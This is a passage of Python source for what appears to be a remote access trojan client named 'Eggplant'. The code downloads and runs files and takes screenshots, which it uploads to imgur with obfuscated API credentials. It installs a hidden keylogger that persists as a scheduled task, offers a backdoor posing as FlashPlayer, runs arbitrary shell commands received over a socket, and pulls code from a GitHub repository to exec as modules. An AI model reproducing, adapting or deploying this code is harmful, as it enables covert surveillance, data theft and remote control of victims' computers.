        if not url.startswith('http'):
            return 'Error: URL must begin with http:// or https:// '
        try:
            data = get(url).text.encode()
        except Exception as x:
            return "Wget '%s' returned error: %s" % (str(url), str(x))
    
        filetype    = os.path.splitext(url)[1]
        filename    = os.path.basename(os.path.splitext(url)[0])
        tempfile    = self._tempfile(base, filetype) if base else self._tempfile(base=filename, extension=filetype)

        if extension in ('.exe','.sh'):
            with file(filename, 'wb') as fp:
                fp.write(data)
                
        else:
            with file(filename, 'w') as fp:
                fp.write(data)
                
        return filename

    def screenshot(self):
        global create_module
        if 'screenshot' not in self.modules:
            code = get(os.path.join(self.urls['raw'], 'screenshot.py')).text.encode()
            mod  = create_module(code, 'screenshot')
            self.modules['screenshot'] = mod

        pic = self.modules['screenshot']()

        with open(pic, 'rb') as fp:
            contents = b64encode(fp.read())

        a = 'MDA0MWU3NjVkZTQ3NDQyMTQ2ZTg0MDk2OGZlMjNmNDdmNTdjMjIzMGM2NDljMzQ3MWJiY2VhNDE0NWE2YjFmZTliODcxMTg0NDZjOTJjZjkyMTI2YTU4N2NmMjk3YWVmMjYzMTBlNA==','ZmY0M2Q2OWM1Yjk2YjkwZWU2NzVkOWI2ODk5OTVlYjdmODg1NTRmYzgyMGRlMzU0MWNkMDE5ODE3NGY0ZDQ4NmViYjJlOTMwMTM1NTNlNzcwYjYzZjA0N2M4ODA3MzhkMTMwZDE0ZDZkYjU0ODM3NmM3YzQ3NjdhMTU2M2FiNzM3MzUyMTUzOWI2ZDYwMGUzN2FmZTAzZTI0NDQ2ODMxZDBhNzUyYmM2NWZkMzY1NGQxYjMzODdlYjhhYzg1OTQ2YjFhYjMzZDlkNTQ5MTM5NGI4OTY4NGQ2MTJiZWI3NDJlYjczMjdlMzg='
        b = post(self.urls.get('imgur'), headers={self._deobfuscate(a[0]) : self._deobfuscate(a[1])}, data={'image':contents, 'type':'base64'})
        return b.json().get('data').get('link').encode()
        
    def keylogger(self, action):

        if action not in ("start","status","stop"):
            return "usage: keylogger <start/status/stop>"
        
        if os.name is 'nt':
            if 'start' in action:
                if 'keylogger' in self.files:
                    if os.path.isfile(self.files.get('keylogger')):
                        os.startfile(self.files.get('keylogger'))
                else:
                    egglog   = os.path.join(self.urls['raw'], 'keylogger.py')
                    kname    = 'egglog'
                    interval = 'hourly'
                    kfile = self.wget(egglog)
                    self.persistence.update({'keylogger':[kfile]})
                    os.startfile(kfile)
                    hide = os.popen('attrib +h {}'.format(kfile)).read()
                    self.persistence.get('hidden files').append(kfile)
                    create  = os.popen('schtasks /CREATE /TN {} /TR {} /SC {}'.format(kname, kfile, interval)).read()                        
                    if 'SUCCESS' in create:
                        self.persistence.get('scheduled tasks').append(kname)
                    return create
                
            elif 'stop' in action:
                if 'keylogger' in self.files:
                    _ = map(os.remove, self.files.get('keylogger'))
                tasks = [self.persistence.get('scheduled tasks').pop(i) for i in self.persistence.get('scheduled tasks') if 'egglog' in i.lower()]
                d = [os.popen('schtasks /delete /tn {} /f'.format(task)).read() for task in tasks]
                return "\n".join(d)
                
            elif 'status' in action:
                try:
                    tasks = [i for i in self.persistence.get('scheduled tasks') if 'egglog' in i.lower()]
                    d = [os.popen('schtasks /query /tn {}'.format(task)).read() for task in tasks]
                    return "\n".join(d)
                except Exception as stx:
                    return "Keylogger status failed with error: {}".format(str(stx))
            else:
                return "Invalid command"
        else:
            ans = "Mac OS X not yet supported for remote logging." if sys.platform in ('darwin','ios') else "{}-based platforms not yet supported for remote logging".format(sys.platform)
            return ans

    def backdoor(self, app='FlashPlayer'):
        try:
            result = self._backdoor(appname=app)
            return result
        except Exception as e:
            if self.debug:
                print "Backdoor commmand failed with error: {}".format(str(e))
            return "Backdoor commmand failed with error: {}".format(str(e))

    def restart(self, **kwargs):
        return Eggplant(**self.__dict__)

    def install_update(self, **kwargs):
        global create_module
        repo = get(self.urls.get('repo')).json()
        for i in repo:
            if 'client.py' in i.get('name'):
                code    = get(i.get('download_url')).json().get('content')
                module  = create_module(code, name)                
        return True
            
    def standby(self, host):
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('', self.listen_port))
            s.listen(1)
            conn, addr = s.accept()
            if addr[0] == host:
                self.socket = conn
                self.dhkey  = self._diffiehellman()
                break
            else:
                self._kill(sock=conn)
                return self._standby()
        return self.run()

    def run(self, connection=None):
        while connection:
            self._send("Client[{}]> ", method='prompt')
            cmd_buffer = ""
            cmd_len    = 1
            
            while cmd_len:
                cmd_data    = self.socket.recv(1024)
                cmd_len     = len(cmd_data)
                cmd_buffer += cmd_data
                if cmd_len < 1024:
                    break

            if len(cmd_buffer):
                
                data = self._decrypt(cmd_buffer).rstrip()
                cmd, _, action = data.partition(' ')
                
                if cmd in self.commands:
                    output = self.commands[cmd](action) if action else self.commands[cmd]()
                    
                elif cmd in self.modules:
                    output = self.modules[cmd](action) if action else self.modules[cmd]()
                    
                elif cmd in globals():
                    output = globals()[cmd](action) if action else globals()[cmd]()

                else:
                    try:
                        output = run_module(cmd, action) if action else run_module(cmd)
                    except:
                        p = subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
                        output = str().join((p.communicate()))

                self._send(bytes(output), method=cmd)
                
        try:
            if self.debug:
                print 'Standing by...'
            self.standby(self.socket.getpeername()[0])
        except Exception as by:
            if self.debug:
                print 'Standby error: %s' % str(by)
            sleep(10)
            execfile(sys.argv[0])
            sys.exit(0)

#-----------------------------------------------

def install(package):
    if 'Crypto' in package:
        package = 'Crypto'
    elif 'win32' in package:
        package = 'pywin32'
    try:
        _ = pip.InstallCommand().main([package])            
    except Exception as e:
        'Install %s failed with error: %s' % (str(package), str(e))


def configure():
    try:
        dependencies = dict({
                             'AES':'Crypto.Cipher',
                             'HMAC':'Crypto.Hash',
                             'SHA256':'Crypto.Hash',
                             'bytes_to_long':'Crypto.Util.number',
                             'long_to_bytes':'Crypto.Util.number'
                            })
        if os.name is 'nt':
            dependencies['ShellExecuteEx'] = 'win32com.shell.shell'
            dependencies['HKEY_CURRENT_USER'] = '_winreg'
            dependencies['KEY_WRITE'] = '_winreg'
            dependencies['KEY_ALL_ACCESS'] = '_winreg'
            dependencies['REG_SZ'] = '_winreg'
            dependencies['CloseKey'] = '_winreg'
            dependencies['DeleteValue'] = '_winreg'
            dependencies['OpenKey'] = '_winreg'
            dependencies['SetValueEx'] = '_winreg'

        for module in dependencies:
            package = dependencies[module]
            if module not in globals():
                install(package)
                exec "from %s import %s" % (package, module)
        return True
    except:
        return False

def update():
    try:
        pull = get('https://api.github.com/repos/colental/AngryEggplant/contents').json()
        for i in pull:
            try:
                if i.get('name').encode() == 'modules':
                    recurse = i.get('git_url') + '?recursive=True'
                    modules = get(recurse).json()
                    for url in modules.get('tree'):
                        info    = get(url.get('url')).json()
                        code    = b64decode(info.get('content'))
                        name    = os.path.splitext(info.get('path').encode())[0]
                        module  = create_module(code, name)
                        print "Module ['%s'] successfully loaded" % name
            except: pass
        return True
    except Exception as e2:
        print 'Reload modules - import code - returned error: %s' % str(e2)
        return False

def create_module(code, name):
    try:
        module = new_module(name)
        exec code in module.__dict__
        sys.modules[name] = module
        return module
    except: pass
    
def resource_path(relative_path):
    return os.path.join(getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__))), relative_path)  

def main():
    while True:
        configured = configure()
        while configured:
            updated = update()
            while updated:
                try:
                    e = Eggplant(debug=True)                
                    e.run(e.socket)
                except:
                    print 'Reconnecting in 10...'        
                    sleep(10)
            print 'Re-loading modules in 10...'
            sleep(10)
        print 'Re-configuring in 10...'
        sleep(10)
    
    
        


if __name__ == '__main__':
    main()
